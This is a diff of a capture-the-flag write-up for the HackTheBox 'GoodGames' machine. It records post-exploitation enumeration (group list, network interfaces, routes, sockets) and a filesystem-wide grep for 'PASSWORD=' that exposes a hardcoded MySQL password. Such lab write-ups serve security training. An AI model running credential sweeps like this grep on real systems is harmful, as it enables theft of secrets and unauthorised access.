+staff:x:50:
+games:x:60:
+users:x:100:
+nogroup:x:65534:
+systemd-journal:x:101:
+systemd-timesync:x:102:
+systemd-network:x:103:
+systemd-resolve:x:104:
+input:x:105:
+kvm:x:106:
+render:x:107:
+crontab:x:108:
+netdev:x:109:
+messagebus:x:110:
+ssh:x:111:
+augustus:x:1000:
+systemd-coredump:x:999:
+ssl-cert:x:112:
+mysql:x:113:
+docker:x:114:
+```
+
+## Network Enumeration
+
+> ip a
 ```
 augustus@GoodGames:~$ ip a
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
@@ -1550,50 +1750,180 @@ augustus@GoodGames:~$ ip a
     inet6 ::1/128 scope host 
        valid_lft forever preferred_lft forever
 2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
-    link/ether 00:50:56:b9:28:07 brd ff:ff:ff:ff:ff:ff
+    link/ether 00:50:56:b9:4b:3c brd ff:ff:ff:ff:ff:ff
     inet 10.10.11.130/24 brd 10.10.11.255 scope global eth0
        valid_lft forever preferred_lft forever
-    inet6 dead:beef::250:56ff:feb9:2807/64 scope global dynamic mngtmpaddr 
-       valid_lft 86392sec preferred_lft 14392sec
-    inet6 fe80::250:56ff:feb9:2807/64 scope link 
+    inet6 dead:beef::250:56ff:feb9:4b3c/64 scope global dynamic mngtmpaddr 
+       valid_lft 86399sec preferred_lft 14399sec
+    inet6 fe80::250:56ff:feb9:4b3c/64 scope link 
        valid_lft forever preferred_lft forever
-3: br-99993f3f3b6b: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
-    link/ether 02:42:38:cb:fa:59 brd ff:ff:ff:ff:ff:ff
-    inet 172.19.0.1/16 brd 172.19.255.255 scope global br-99993f3f3b6b
-       valid_lft forever preferred_lft forever
-    inet6 fe80::42:38ff:fecb:fa59/64 scope link 
-       valid_lft forever preferred_lft forever
-4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
-    link/ether 02:42:a2:f3:b2:c5 brd ff:ff:ff:ff:ff:ff
+3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
+    link/ether 02:42:aa:a6:e5:be brd ff:ff:ff:ff:ff:ff
     inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
        valid_lft forever preferred_lft forever
-6: vethbc80a3e@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-99993f3f3b6b state UP group default 
-    link/ether 5a:79:8d:6e:d3:d7 brd ff:ff:ff:ff:ff:ff link-netnsid 0
-    inet6 fe80::5879:8dff:fe6e:d3d7/64 scope link 
+4: br-99993f3f3b6b: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:91:9b:25:90 brd ff:ff:ff:ff:ff:ff
+    inet 172.19.0.1/16 brd 172.19.255.255 scope global br-99993f3f3b6b
        valid_lft forever preferred_lft forever
+    inet6 fe80::42:91ff:fe9b:2590/64 scope link 
+       valid_lft forever preferred_lft forever
+6: veth1e2b4c6@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-99993f3f3b6b state UP group default 
+    link/ether b2:a1:69:b0:c0:5b brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet6 fe80::b0a1:69ff:feb0:c05b/64 scope link 
+       valid_lft forever preferred_lft forever
+```
 
+> ip r
+```
 augustus@GoodGames:~$ ip r
 default via 10.10.10.2 dev eth0 onlink 
 10.10.11.0/24 dev eth0 proto kernel scope link src 10.10.11.130 
 172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 linkdown 
-172.19.0.0/16 dev br-99993f3f3b6b proto kernel scope link src 172.19.0.1 
+172.19.0.0/16 dev br-99993f3f3b6b proto kernel scope link src 172.19.0.1
+```
 
-augustus@GoodGames:~$ netstat -ant
-Active Internet connections (servers and established)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State      
-tcp        0      0 127.0.0.1:8085          0.0.0.0:*               LISTEN     
-tcp        0      0 172.19.0.1:22           0.0.0.0:*               LISTEN     
-tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
-tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
-tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
-tcp        0      0 172.19.0.1:33442        172.19.0.2:8085         FIN_WAIT2  
-tcp        0      0 172.19.0.1:22           172.19.0.2:57686        ESTABLISHED
-tcp        0    206 10.10.11.130:33136      10.10.14.4:8888         ESTABLISHED
-tcp        0      0 10.10.11.130:33644      10.10.14.4:9002         ESTABLISHED
-tcp        0      0 172.19.0.1:33360        172.19.0.2:8085         FIN_WAIT2  
-tcp        0      0 172.19.0.1:45100        172.19.0.2:8085         FIN_WAIT2  
-tcp        0      0 172.19.0.1:22           172.19.0.2:57600        ESTABLISHED
-tcp6       0      0 :::80                   :::*                    LISTEN
+> ip neigh
+```
+augustus@GoodGames:~$ ip neigh
+172.19.0.2 dev br-99993f3f3b6b lladdr 02:42:ac:13:00:02 STALE
+10.10.10.2 dev eth0 lladdr 00:50:56:b9:17:d8 REACHABLE
+fe80::250:56ff:feb9:17d8 dev eth0 lladdr 00:50:56:b9:17:d8 router STALE
+```
+
+> netstat -ano
+```
+augustus@GoodGames:~$ netstat -ano                                                                                                                                                                      
+Active Internet connections (servers and established)                                                                                                                                                   
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer                                                                                                                   
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      off (0.00/0/0)                                                                                                          
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)                                                                                                          
+tcp        0      0 127.0.0.1:8085          0.0.0.0:*               LISTEN      off (0.00/0/0)                                                                                                          
+tcp        0      0 172.19.0.1:22           0.0.0.0:*               LISTEN      off (0.00/0/0)                                                                                                          
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      off (0.00/0/0)                                                                                                          
+tcp        0    494 10.10.11.130:50988      10.10.14.5:443          ESTABLISHED on (0.09/0/0)                                                                                                           
+tcp        0      0 10.10.11.130:38660      10.10.14.5:443          ESTABLISHED keepalive (14.37/0/0)                                                                                                   
+tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)                                                                                                          
+udp        0      0 10.10.11.130:45941      1.1.1.1:53              ESTABLISHED off (0.00/0/0)                                                                                                          
+udp        0      0 10.10.11.130:53788      8.8.8.8:53              ESTABLISHED off (0.00/0/0)                                                                                                          
+Active UNIX domain sockets (servers and established)                                                                                                                                                    
+Proto RefCnt Flags       Type       State         I-Node   Path                       
+unix  2      [ ACC ]     STREAM     LISTENING     16130    /run/containerd/containerd.sock.ttrpc
+unix  2      [ ACC ]     STREAM     LISTENING     16134    /run/containerd/containerd.sock
+unix  4      [ ]         DGRAM                    9805     /run/systemd/notify
+unix  2      [ ACC ]     STREAM     LISTENING     13389    /run/dbus/system_bus_socket
+unix  2      [ ACC ]     STREAM     LISTENING     13393    /var/run/docker.sock
+unix  2      [ ACC ]     STREAM     LISTENING     9809     /run/systemd/private
+unix  2      [ ]         DGRAM                    9822     /run/systemd/journal/syslog
+unix  2      [ ACC ]     STREAM     LISTENING     18018    /var/run/mysqld/mysqld.sock
+unix  6      [ ]         DGRAM                    9826     /run/systemd/journal/dev-log
+unix  2      [ ACC ]     SEQPACKET  LISTENING     9830     /run/udev/control          
+unix  2      [ ACC ]     STREAM     LISTENING     9838     /run/systemd/journal/stdout
+unix  8      [ ]         DGRAM                    9841     /run/systemd/journal/socket
+unix  2      [ ]         DGRAM                    57209    /run/user/1000/systemd/notify                                                                                                                
+unix  2      [ ACC ]     STREAM     LISTENING     16250    /var/run/docker/metrics.sock
+unix  2      [ ACC ]     STREAM     LISTENING     57213    /run/user/1000/systemd/private
+unix  2      [ ACC ]     STREAM     LISTENING     57219    /run/user/1000/gnupg/S.gpg-agent
+unix  2      [ ACC ]     STREAM     LISTENING     57221    /run/user/1000/gnupg/S.gpg-agent.browser
+unix  2      [ ACC ]     STREAM     LISTENING     57223    /run/user/1000/gnupg/S.dirmngr
+unix  2      [ ACC ]     STREAM     LISTENING     57225    /run/user/1000/gnupg/S.gpg-agent.ssh
+unix  2      [ ACC ]     STREAM     LISTENING     57227    /run/user/1000/bus
+unix  2      [ ACC ]     STREAM     LISTENING     57229    /run/user/1000/gnupg/S.gpg-agent.extra
+unix  2      [ ACC ]     STREAM     LISTENING     18573    /run/containerd/s/ba8e340b3994e93fb84039a5ad095c5b373251b52e32c0508926f79c2708ffa5
+unix  2      [ ACC ]     STREAM     LISTENING     17069    /var/run/docker/libnetwork/882320925cb9.sock
+unix  2      [ ACC ]     STREAM     LISTENING     14001    /run/php/php7.4-fpm.sock
+unix  2      [ ACC ]     STREAM     LISTENING     9906     /run/systemd/fsck.progress     
+unix  2      [ ACC ]     STREAM     LISTENING     13013    /var/run/vmware/guestServicePipe
+unix  2      [ ACC ]     STREAM     LISTENING     17902    /var/run/mysqld/mysqlx.sock
+unix  2      [ ]         DGRAM                    16184    @00001
+unix  2      [ ACC ]     STREAM     LISTENING     17904    /root/.pm2/pub.sock
+unix  2      [ ACC ]     STREAM     LISTENING     17905    /root/.pm2/rpc.sock
+unix  3      [ ]         STREAM     CONNECTED     16139    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     11840    
+unix  3      [ ]         STREAM     CONNECTED     17305                               
+unix  2      [ ]         DGRAM                    11943    
+unix  3      [ ]         STREAM     CONNECTED     17307    
+unix  3      [ ]         STREAM     CONNECTED     11841    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     13409    
+unix  3      [ ]         STREAM     CONNECTED     17310    
+unix  3      [ ]         STREAM     CONNECTED     17312    
+unix  2      [ ]         STREAM     CONNECTED     16847    
+unix  3      [ ]         DGRAM                    11945    
+unix  3      [ ]         DGRAM                    11946    
+unix  3      [ ]         STREAM     CONNECTED     16482    
+unix  3      [ ]         STREAM     CONNECTED     17309    
+unix  3      [ ]         STREAM     CONNECTED     17306    
+unix  3      [ ]         STREAM     CONNECTED     11779    
+unix  2      [ ]         DGRAM                    11381    
+unix  2      [ ]         STREAM     CONNECTED     18649    
+unix  3      [ ]         STREAM     CONNECTED     12422    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     17311    
+unix  3      [ ]         DGRAM                    11948    
+unix  3      [ ]         STREAM     CONNECTED     11378    
+unix  3      [ ]         STREAM     CONNECTED     17308    
+unix  3      [ ]         STREAM     CONNECTED     13545    /run/dbus/system_bus_socket
+unix  3      [ ]         DGRAM                    11947    
+unix  3      [ ]         STREAM     CONNECTED     14345    /run/systemd/journal/stdout
+unix  2      [ ]         DGRAM                    10084    
+unix  2      [ ]         DGRAM                    57134    
+unix  3      [ ]         STREAM     CONNECTED     13257    
+unix  2      [ ]         DGRAM                    57137    
+unix  3      [ ]         STREAM     CONNECTED     11780    /run/systemd/journal/stdout
+unix  3      [ ]         DGRAM                    57211    
+unix  3      [ ]         STREAM     CONNECTED     18660    
+unix  3      [ ]         STREAM     CONNECTED     13258    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     57215    
+unix  3      [ ]         STREAM     CONNECTED     19057    
+unix  3      [ ]         STREAM     CONNECTED     18584    /run/containerd/s/ba8e340b3994e93fb84039a5ad095c5b373251b52e32c0508926f79c2708ffa5
+unix  3      [ ]         DGRAM                    57212    
+unix  3      [ ]         STREAM     CONNECTED     15402    
+unix  2      [ ]         DGRAM                    12355    
+unix  3      [ ]         STREAM     CONNECTED     56139    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     12621    
+unix  3      [ ]         STREAM     CONNECTED     18227    
+unix  3      [ ]         STREAM     CONNECTED     14510    
+unix  3      [ ]         STREAM     CONNECTED     19748    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     15404    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     18661    /run/containerd/containerd.sock.ttrpc
+unix  3      [ ]         STREAM     CONNECTED     14343    
+unix  3      [ ]         STREAM     CONNECTED     16255    /run/containerd/containerd.sock
+unix  3      [ ]         STREAM     CONNECTED     13541    
+unix  3      [ ]         STREAM     CONNECTED     16267    
+unix  3      [ ]         STREAM     CONNECTED     16254    
+unix  2      [ ]         DGRAM                    16138    
+unix  2      [ ]         DGRAM                    19682    
+unix  3      [ ]         STREAM     CONNECTED     13542    
+unix  3      [ ]         STREAM     CONNECTED     13999    
+unix  3      [ ]         STREAM     CONNECTED     11871    /run/systemd/journal/stdout
+unix  2      [ ]         DGRAM                    16185    
+unix  3      [ ]         STREAM     CONNECTED     14000    
+unix  3      [ ]         STREAM     CONNECTED     16269    /run/containerd/containerd.sock
+unix  2      [ ]         DGRAM                    13411    
+unix  3      [ ]         DGRAM                    11384    
+unix  2      [ ]         DGRAM                    12632    
+unix  3      [ ]         STREAM     CONNECTED     57128    
+unix  3      [ ]         DGRAM                    9807     
+unix  3      [ ]         STREAM     CONNECTED     13655    /run/dbus/system_bus_socket
+unix  3      [ ]         DGRAM                    9808     
+unix  2      [ ]         DGRAM                    13531    
+unix  3      [ ]         STREAM     CONNECTED     13131    
+unix  3      [ ]         STREAM     CONNECTED     13543    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     13654    
+unix  2      [ ]         DGRAM                    14730    
+unix  3      [ ]         DGRAM                    11385    
+unix  3      [ ]         STREAM     CONNECTED     56108    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     143767   
+unix  3      [ ]         STREAM     CONNECTED     14511    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     143768   /run/systemd/journal/stdout
+```
+
+## Password Hunting
+
+> grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null
+```
+...
+/var/www/goodgames/main/main.py:12:        connector = mysql.connector.connect(user='main_admin', password='C4n7_Cr4cK_7H1S_pasSw0Rd!', host='127.0.0.1', database='main')
+/var/www/goodgames/main/auth.py:18:        connector = mysql.connector.connect(user='main_admin', password='C4n7_Cr4cK_7H1S_pasSw0Rd!', host='127.0.0.1', database='main')
+...
 ```
 
 ### linpeas
@@ -1616,7 +1946,7 @@ nameserver 8.8.8.8
 resulted in adding the following to /etc/hosts:
 ```
 127.0.0.1       localhost
-127.0.1.1       redteam
+...
 10.10.11.130    goodgames.htb
 10.10.11.130    internal-administration.goodgames.htb
 10.10.11.130    experimental-search.goodgames.htb
